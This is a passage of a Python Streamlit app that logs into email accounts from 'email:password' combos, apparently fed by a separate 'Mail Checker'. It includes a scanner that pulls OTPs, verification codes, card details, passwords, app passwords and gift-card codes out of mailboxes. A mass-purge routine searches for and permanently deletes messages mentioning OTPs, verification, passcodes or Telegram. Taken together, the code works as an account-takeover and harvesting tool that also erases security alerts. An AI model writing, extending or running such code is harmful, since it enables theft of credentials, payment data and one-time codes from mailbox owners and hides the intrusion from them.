        st.error("Please select a valid account from the dropdown list first.")
    else:
        acc_email, acc_pass = actual_pick.split(":", 1)
        hosts = candidate_hosts(acc_email)
        last, connected_host, folders, success = "no host", "", ["INBOX"], False
        test_mail = None

        with st.spinner(f"Connecting to {acc_email} and discovering folders..."):
            for host in hosts:
                try:
                    test_mail = open_mail(acc_email, acc_pass, host)
                    folders = list_folders(test_mail, email_addr=acc_email, host_val=host)
                    connected_host = host
                    success = True
                    break
                except MsVerdict as mv:                    # v13.37
                    last = f"{host}: {mv.detail} [{mv.verdict}]"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass
                    break
                except Exception as e:
                    last = f"{host}: {e}"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass

        if success:
            combo = f"{acc_email}:{acc_pass}"
            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != combo:
                try:
                    st.session_state.active_mail.logout()
                except Exception:
                    pass

            st.session_state.active_mail = test_mail
            st.session_state.connected_account_combo = combo
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            save_session_cache()
            log(f"Discovered {len(folders)} folders via {connected_host}")
            st.success(f"Connected: {connected_host} ({len(folders)} folders) — path: {_conn_path()}")
        else:
            if acc_email.split("@")[-1].lower() in ZERO_ACCESS_PROVIDERS:
                st.error(f"{last} — this provider has no standard IMAP endpoint (needs an app password / bridge).")
            else:
                st.error(last)
# @@END 036


# @@BLOCK 037 FOLDER_LOGS_AND_CONTROLS deps=036
if st.session_state.folder_debug_logs:
    with st.expander("🛠️ Folder Discovery Diagnostic Traces", expanded=False):
        st.code("\n".join(st.session_state.folder_debug_logs), language="text")

col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
with col2:
    page_size = st.slider("Page size", 5, 200, 15)
with col3:
    sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])

if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
    host = resolve_active_host(active_email)
    if not active_email or not active_password or not host:
        st.error("Please connect and load folders first.")
    else:
        try:
            with st.spinner(f"Loading folder '{folder}'..."):
                mail = get_active_mail(active_email, active_password, host)
                msgs = fetch_messages_paginated(
                    mail, active_email, active_password, host, [folder], mode="FOLDER_ONLY",
                    page_size=page_size, page_number=1, sort_order=sort_order, log_target="DEBUG"
                )
                st.session_state.current_messages = msgs
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                save_session_cache()
                log(f"Loaded {len(msgs)} messages from folder '{folder}'.")
        except Exception as e:
            st.error(str(e))
# @@END 037


# @@BLOCK 038 MAIN_STREAM deps=037
# Main Message Stream
if st.session_state.bot_filter_mode:
    active_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    st.info("⚠️ Message stream is currently filtered to show DETECTED BOT/SPAM/TELEGRAM/BLACKLIST MESSAGES ONLY.")
else:
    active_msgs = st.session_state.current_messages

total_msgs = st.session_state.total_matched_count or len(active_msgs)

if len(active_msgs) > 0:
    st.markdown("---")

    total_pages = max(1, math.ceil(total_msgs / page_size))
    curr_p = st.session_state.current_page

    with st.expander(f"✉️ Main Message Stream — Page {curr_p} of {total_pages} ({total_msgs} Total Matches)", expanded=False):
        st.markdown(f"**Showing Page {curr_p} of {total_pages} (Total Server Matches: {total_msgs})**")

        for idx, msg in enumerate(active_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit / Credit Card / Transaction Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Login/Credential Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['folder']}_{msg['id']}_{idx}")

                op_col1, op_col2, op_col3, op_col4 = st.columns(4)
                host = resolve_active_host(active_email)
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with op_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with op_col2:
                    target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            move_message(m_client, msg["folder"], msg["id"], target_move)
                            st.session_state.current_messages.remove(msg)
                            save_session_cache()
                            st.success(f"Moved to {target_move}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with op_col3:
                    del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(del_label, key=f"del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.current_messages.remove(msg)
                            save_session_cache()
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with op_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        p_col1, p_col2, p_col3 = st.columns([1, 2, 1])

        with p_col1:
            if st.button("Previous Page", disabled=(curr_p <= 1), use_container_width=True, key="msg_stream_prev"):
                st.session_state.current_page -= 1
                host = resolve_active_host(active_email)
                mail = get_active_mail(active_email, active_password, host)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, [folder],
                    mode="FOLDER_ONLY",
                    page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                    log_target="DEBUG"
                )
                save_session_cache()
                st.rerun()

        with p_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {curr_p} of {total_pages}</h4>", unsafe_allow_html=True)

        with p_col3:
            if st.button("Next Page", disabled=(curr_p >= total_pages), use_container_width=True, key="msg_stream_next"):
                st.session_state.current_page += 1
                host = resolve_active_host(active_email)
                mail = get_active_mail(active_email, active_password, host)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, [folder],
                    mode="FOLDER_ONLY",
                    page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                    log_target="DEBUG"
                )
                save_session_cache()
                st.rerun()
# @@END 038


# @@BLOCK 039 OTP_SCANNER deps=038
# Standalone OTP / Debit / Sensitive Data Scanner
st.markdown("---")
with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scanner", expanded=False):
    st.markdown("#### Dynamic OTP, Password, Debit & Credit Cards, Gift Cards, Telegram & Credential Scanner Controls")

    otp_c1, otp_c2, otp_c3 = st.columns([2, 1, 1])
    otp_folder_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]

    with otp_c1:
        otp_scope_choice = st.multiselect("Target Folder Scope", otp_folder_options, default=["INBOX"], key="otp_scan_scope")
    with otp_c2:
        category_options = [
            "All Security Categories", "Debit Card & Credit Card Details", "Bank Debit Alert & Online Debit",
            "Order Tracking & Purchase Confirmation", "OTP Message & Verification", "Telegram Alerts & Blacklist",
            "Password / Reset Code", "Gift Cards", "ID Cards / Credentials", "Application Passwords", "Login Info / Info"
        ]
        otp_scan_category = st.multiselect("Target Data Type Dropdown", category_options, default=["All Security Categories"], key="otp_category_select")
    with otp_c3:
        otp_search_field = st.selectbox("Scan Field", ["TEXT", "SUBJECT", "BODY", "FROM"], key="otp_search_field")

    otp_page_size = st.slider("OTP Scanner Results Page Size", 5, 200, 15, key="otp_page_size_slider")

    t_col1, t_col2 = st.columns(2)
    with t_col1:
        otp_auto_clean_toggle = st.toggle("Auto-Clean HTML & Boilerplate", value=True, key="otp_clean_toggle")
    with t_col2:
        otp_deep_regex_chk = st.checkbox("Enable Deep Regex Code, Debit & Credit Card Extraction", value=True, key="otp_regex_chk")

    preset_keywords_map = {
        "All Security Categories": "OTP password debit credit card gift payment credential login verification reset order tracking confirmation telegram blacklist banned",
        "Debit Card & Credit Card Details": "debit card credit card cardholder cvv cvc exp expiry cardholder payment",
        "Bank Debit Alert & Online Debit": "bank debit online purchase debited debit alert account debited transaction paid",
        "Order Tracking & Purchase Confirmation": "order tracking tracking number purchase order order confirmation PO tracking",
        "OTP Message & Verification": "OTP verification code verify auth token pin",
        "Telegram Alerts & Blacklist": "telegram tg t.me blacklist blacklisted banned blocked spam",
        "Password / Reset Code": "password reset passwd new password",
        "Gift Cards": "gift card claim code voucher redeem",
        "ID Cards / Credentials": "id card identity credentials account info",
        "Application Passwords": "app password application password token secret",
        "Login Info / Info": "login details signin info account access"
    }

    otp_custom_keyword = st.text_input("Custom Keyword Override (Optional)", key="otp_custom_kw")
    otp_blacklist_input = st.text_input("Blacklist Keywords (comma-separated)", value="Telegram, spam, scam, promo", key="otp_blacklist_kw")

    if st.button("🚀 Execute Dedicated Security Scan", type="primary", use_container_width=True, key="otp_exec_btn"):
        host = resolve_active_host(active_email)
        if not active_email or not active_password or not host:
            st.error("Please connect and discover folders first.")
        elif not otp_scope_choice:
            st.warning("Please select at least one folder from Target Folder Scope.")
        else:
            try:
                target_scope = otp_scope_choice
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"

                with st.spinner(f"Scanning target folders ({len(target_scope)}) for security payload [{kw_to_use}]..."):
                    mail = get_active_mail(active_email, active_password, host)
                    msgs = fetch_messages_paginated(
                        mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field,
                        mode="SEARCH", page_size=otp_page_size, page_number=1, sort_order=sort_order,
                        log_target="OTP"
                    )
                    st.session_state.otp_messages = msgs
                    st.session_state.otp_current_page = 1
                    save_session_cache()
                    otp_log(f"Scan complete. Retrieved {st.session_state.otp_total_matched_count} matching messages.")
            except Exception as e:
                st.error(str(e))

    st.markdown("#### 🔒 Standalone Security & Card Message Stream")
    otp_msgs = [m for m in st.session_state.otp_messages if not should_blacklist_message(m, otp_blacklist_input)]
    otp_total = len(otp_msgs)

    if len(otp_msgs) > 0:
        otp_total_pages = max(1, math.ceil(otp_total / otp_page_size))
        otp_curr_p = st.session_state.otp_current_page

        st.markdown(f"**Showing Page {otp_curr_p} of {otp_total_pages} (Total Security Matches: {otp_total})**")

        for idx, msg in enumerate(otp_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes / OTPs:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit, Credit Card & Purchase Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Passwords / Credentials / App Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                display_body = msg["body"] if otp_auto_clean_toggle else msg["body"]
                st.text_area("Message Payload Body", value=display_body, height=150, key=f"otp_b_{msg['folder']}_{msg['id']}_{idx}")

                o_col1, o_col2, o_col3, o_col4 = st.columns(4)
                host = resolve_active_host(active_email)
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with o_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"otp_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with o_col2:
                    otp_mv_target = st.selectbox("Move to", st.session_state.mb_folders, key=f"otp_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"otp_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            move_message(m_client, msg["folder"], msg["id"], otp_mv_target)
                            st.session_state.otp_messages.remove(msg)
                            save_session_cache()
                            st.success(f"Moved to {otp_mv_target}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col3:
                    if st.button("Delete Message", key=f"otp_del_{msg['folder']}_{msg['id']}_{idx}", type="primary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.otp_messages.remove(msg)
                            save_session_cache()
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        op_c1, op_c2, op_c3 = st.columns([1, 2, 1])

        with op_c1:
            if st.button("Previous Page", disabled=(otp_curr_p <= 1), use_container_width=True, key="otp_prev_pg"):
                st.session_state.otp_current_page -= 1
                host = resolve_active_host(active_email)
                mail = get_active_mail(active_email, active_password, host)
                target_scope = otp_scope_choice if otp_scope_choice else [folder]
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                st.session_state.otp_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field,
                    mode="SEARCH", page_size=otp_page_size, page_number=st.session_state.otp_current_page,
                    sort_order=sort_order, log_target="OTP"
                )
                save_session_cache()
                st.rerun()

        with op_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {otp_curr_p} of {otp_total_pages}</h4>", unsafe_allow_html=True)

        with op_c3:
            if st.button("Next Page", disabled=(otp_curr_p >= otp_total_pages), use_container_width=True, key="otp_next_pg"):
                st.session_state.otp_current_page += 1
                host = resolve_active_host(active_email)
                mail = get_active_mail(active_email, active_password, host)
                target_scope = otp_scope_choice if otp_scope_choice else [folder]
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                st.session_state.otp_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field,
                    mode="SEARCH", page_size=otp_page_size, page_number=st.session_state.otp_current_page,
                    sort_order=sort_order, log_target="OTP"
                )
                save_session_cache()
                st.rerun()
    else:
        st.caption("No security messages scanned yet. Select categories or keywords and click 'Execute Dedicated Security Scan'.")

    st.markdown("#### 🛠️ OTP Engine Debugging & Diagnose Log Screen")
    with st.expander("🔐 OTP Scanner IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.otp_diag_logs:
            st.code("\n".join(st.session_state.otp_diag_logs), language="text")
        else:
            st.caption("OTP scanner traces and raw server logs will appear here during execution.")
# @@END 039


# @@BLOCK 040 DEEP_SEARCH deps=039
# Deep Keyword Search & Scope Filters
st.markdown("---")
with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
    s_col1, s_col2 = st.columns([1, 1])
    search_scope_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]

    with s_col1:
        search_scope_choice = st.multiselect("Search Scope Option", search_scope_options, default=["INBOX"], key="deep_search_scope")
    with s_col2:
        search_field_choice = st.selectbox("Search Field Option", ["TEXT", "SUBJECT", "BODY", "FROM"], key="deep_search_field")

    search_query_input = st.text_input("Search term or keyword", key="deep_search_query")
    search_blacklist_input = st.text_input("Blacklist Keywords (comma-separated)", value="Telegram, spam, scam, promo", key="deep_search_blacklist_kw")

    search_page_size = st.slider("Search Results Page Size", 5, 200, 15, key="search_page_size_slider")

    if st.button("🔍 Execute Keyword Search", type="primary", use_container_width=True, key="deep_search_btn"):
        host = resolve_active_host(active_email)
        if not active_email or not active_password or not host:
            st.error("Please connect and load folders first.")
        elif not search_query_input.strip():
            st.warning("Please enter a keyword or search term.")
        elif not search_scope_choice:
            st.warning("Please select at least one folder for Search Scope Option.")
        else:
            try:
                target_scope = search_scope_choice
                with st.spinner(f"Scanning target mailboxes ({len(target_scope)} folder/s) for [{search_field_choice}: '{search_query_input.strip()}']..."):
                    mail = get_active_mail(active_email, active_password, host)
                    msgs = fetch_messages_paginated(
                        mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice,
                        mode="SEARCH", page_size=search_page_size, page_number=1, sort_order=sort_order,
                        log_target="SEARCH"
                    )
                    st.session_state.search_messages = msgs
                    st.session_state.search_current_page = 1
                    save_session_cache()
                    log(f"Search found {st.session_state.search_total_matched_count} total matches across target scope.")
            except Exception as e:
                st.error(str(e))

    st.markdown("#### ✉️ Search Results Message Stream")
    search_msgs = [m for m in st.session_state.search_messages if not should_blacklist_message(m, search_blacklist_input)]
    search_total_msgs = len(search_msgs)

    if len(search_msgs) > 0:
        search_total_pages = max(1, math.ceil(search_total_msgs / search_page_size))
        search_curr_p = st.session_state.search_current_page

        st.markdown(f"**Showing Page {search_curr_p} of {search_total_pages} (Total Matches Found: {search_total_msgs})**")

        for idx, msg in enumerate(search_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"s_body_{msg['folder']}_{msg['id']}_{idx}")

                s_op1, s_op2, s_op3, s_op4 = st.columns(4)
                host = resolve_active_host(active_email)
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with s_op1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"s_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with s_op2:
                    s_target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"s_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"s_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            move_message(m_client, msg["folder"], msg["id"], s_target_move)
                            st.session_state.search_messages.remove(msg)
                            save_session_cache()
                            st.success(f"Moved to {s_target_move}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op3:
                    s_del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(s_del_label, key=f"s_del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.search_messages.remove(msg)
                            save_session_cache()
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        sp_col1, sp_col2, sp_col3 = st.columns([1, 2, 1])

        with sp_col1:
            if st.button("Previous Page", disabled=(search_curr_p <= 1), use_container_width=True, key="s_prev_pg"):
                st.session_state.search_current_page -= 1
                host = resolve_active_host(active_email)
                mail = get_active_mail(active_email, active_password, host)
                target_scope = search_scope_choice if search_scope_choice else [folder]
                st.session_state.search_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice,
                    mode="SEARCH", page_size=search_page_size, page_number=st.session_state.search_current_page,
                    sort_order=sort_order, log_target="SEARCH"
                )
                save_session_cache()
                st.rerun()

        with sp_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {search_curr_p} of {search_total_pages}</h4>", unsafe_allow_html=True)

        with sp_col3:
            if st.button("Next Page", disabled=(search_curr_p >= search_total_pages), use_container_width=True, key="s_next_pg"):
                st.session_state.search_current_page += 1
                host = resolve_active_host(active_email)
                mail = get_active_mail(active_email, active_password, host)
                target_scope = search_scope_choice if search_scope_choice else [folder]
                st.session_state.search_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice,
                    mode="SEARCH", page_size=search_page_size, page_number=st.session_state.search_current_page,
                    sort_order=sort_order, log_target="SEARCH"
                )
                save_session_cache()
                st.rerun()
    else:
        st.caption("No search results loaded yet. Enter a query and click 'Execute Keyword Search'.")

    st.markdown("#### 🛠️ Deep Search Debugging & Diagnostic Log Screen")
    with st.expander("🔍 Search Engine IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.search_diag_logs:
            st.code("\n".join(st.session_state.search_diag_logs), language="text")
        else:
            st.caption("Search engine logs will be recorded here after executing a keyword search.")
# @@END 040


# @@BLOCK 041 BOT_PURGE deps=040
# Mass Bot Purge & Intelligence Hub
st.markdown("---")
with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
    all_loaded_bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]

    bot_col1, bot_col2 = st.columns([2, 1])
    bot_scope_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]

    with bot_col1:
        bot_target_folder = st.multiselect("Select Bot Target Scope", bot_scope_options, default=["INBOX"], key="bot_hub_folder_select")
    with bot_col2:
        bot_scan_limit = st.selectbox("Bot Scan Depth", [50, 100, 200, 500], index=1)

    bot_page_size = st.slider("Bot Stream Results Page Size", 5, 200, 15, key="bot_page_size_slider")

    # v13.37: say what the purge really is
    st.caption("⚠️ The purge below is a per-term SERVER search (`telegram`, `otp`, `verification`, "
               "`passcode`, `bot`) followed by \\Deleted + EXPUNGE on every hit in the selected folders. "
               "It removes MORE than the rows previewed here.")

    b_act1, b_act2 = st.columns(2)
    with b_act1:
        if st.button("🔍 Scan Folder For Bot/OTP/Telegram Messages", use_container_width=True):
            host = resolve_active_host(active_email)
            if not active_email or not active_password or not host:
                st.error("Please connect first.")
            elif not bot_target_folder:
                st.warning("Please select at least one folder for Bot Target Scope.")
            else:
                try:
                    target_scope = bot_target_folder
                    with st.spinner("Scanning target folders for bot & Telegram intelligence..."):
                        mail = get_active_mail(active_email, active_password, host)
                        msgs = fetch_messages_paginated(
                            mail, active_email, active_password, host, target_scope, mode="FOLDER_ONLY",
                            page_size=bot_scan_limit, page_number=1, sort_order="Newest First",
                            log_target="DEBUG"
                        )
                        st.session_state.current_messages = msgs
                        st.session_state.bot_filter_mode = True
                        st.session_state.bot_current_page = 1
                        save_session_cache()
                        st.success("Scan complete. Displaying detected bot/Telegram messages.")
                except Exception as ex:
                    st.error(str(ex))

    with b_act2:
        if st.button("🚨 Mass Delete All Detected Bot Messages", type="primary", use_container_width=True):
            if not all_loaded_bot_msgs:
                st.warning("No bot messages detected in current loaded stream to delete.")
            else:
                st.session_state.bot_diag_logs = []
                host = resolve_active_host(active_email)
                try:
                    bot_log("🤖 [BOT ENGINE DIAGNOSTIC START] Initializing Mass Deletion Sequence...")
                    mail = get_active_mail(active_email, active_password, host)
                    deleted_count = 0

                    folders = sorted({bm["folder"] for bm in all_loaded_bot_msgs}) or [folder]
                    terms = ["telegram", "otp", "verification", "passcode", "bot"]
                    for r_folder in folders:
                        r_encoded = encode_imap_utf7(get_imap_path(r_folder))
                        mail.select(f'"{r_encoded}"', readonly=False)
                        found = set()
                        for term in terms:
                            typ, data = mail.search(None, "TEXT", term)
                            if typ == "OK" and data and data[0]:
                                found.update((data[0] or b"").split())
                        for mid in found:
                            mail.store(mid, "+FLAGS", "\\Deleted")
                            deleted_count += 1
                        mail.expunge()

                    bot_log(f"🏁 [MASS DELETE COMPLETE] Successfully purged {deleted_count} bot messages from server.")
                    st.success(f"Successfully deleted {deleted_count} bot messages!")
                    st.session_state.current_messages = [m for m in st.session_state.current_messages if not m["is_bot"]]
                    st.session_state.bot_filter_mode = False
                    save_session_cache()
                    st.rerun()
                except Exception as e:
                    bot_log(f"❌ [MASS DELETE EXCEPTION]: {e}")
                    st.error(f"Error during mass delete: {e}")

    st.markdown("#### 📱 Detected Bot Message Preview Screen")
    if all_loaded_bot_msgs:
        bot_total_pages = max(1, math.ceil(len(all_loaded_bot_msgs) / bot_page_size))
        bot_curr_p = min(st.session_state.bot_current_page, bot_total_pages)
        st.session_state.bot_current_page = bot_curr_p

        start_idx = (bot_curr_p - 1) * bot_page_size
        end_idx = start_idx + bot_page_size
        paged_bot_msgs = all_loaded_bot_msgs[start_idx:end_idx]

        st.markdown(f"**Showing Bot Page {bot_curr_p} of {bot_total_pages} ({len(all_loaded_bot_msgs)} Total Detected Bots)**")

        for idx, bm in enumerate(paged_bot_msgs, start_idx + 1):
            st.markdown(f"**[{idx}] [{bm['folder']}]** `{bm['from']}` — **{bm['subject']}** (ID: `{bm['id']}`) ")
            if bm["pins"]:
                st.info(f"🔑 PINs detected: {', '.join(bm['pins'])}")

        st.markdown("---")
        bp_c1, bp_c2, bp_c3 = st.columns([1, 2, 1])
        with bp_c1:
            if st.button("Previous Bot Page", disabled=(bot_curr_p <= 1), use_container_width=True, key="bot_prev_pg"):
                st.session_state.bot_current_page -= 1
                save_session_cache()
                st.rerun()
        with bp_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {bot_curr_p} of {bot_total_pages}</h4>", unsafe_allow_html=True)
        with bp_c3:
            if st.button("Next Bot Page", disabled=(bot_curr_p >= bot_total_pages), use_container_width=True, key="bot_next_pg"):
                st.session_state.bot_current_page += 1
                save_session_cache()
                st.rerun()
    else:
        st.caption("No bot messages currently loaded in session memory.")

    st.markdown("#### 🛠️ Mass Bot Delete Diagnostic & Diagnose Log Screen")
    if st.session_state.bot_diag_logs:
        st.code("\n".join(st.session_state.bot_diag_logs), language="text")
    else:
        st.caption("Bot engine traces will be printed here during purge operations.")
# @@END 041


# @@BLOCK 042 BACK_TO_CHECKER deps=041
# --- Back to Checker ---
st.markdown("---")
try:
    st.page_link("app.py", label="← Back to the Mail Checker")
except Exception:
    st.caption("The main checker lives at app.py")
# @@END 042


# @@BLOCK 043 TRAILING deps=042
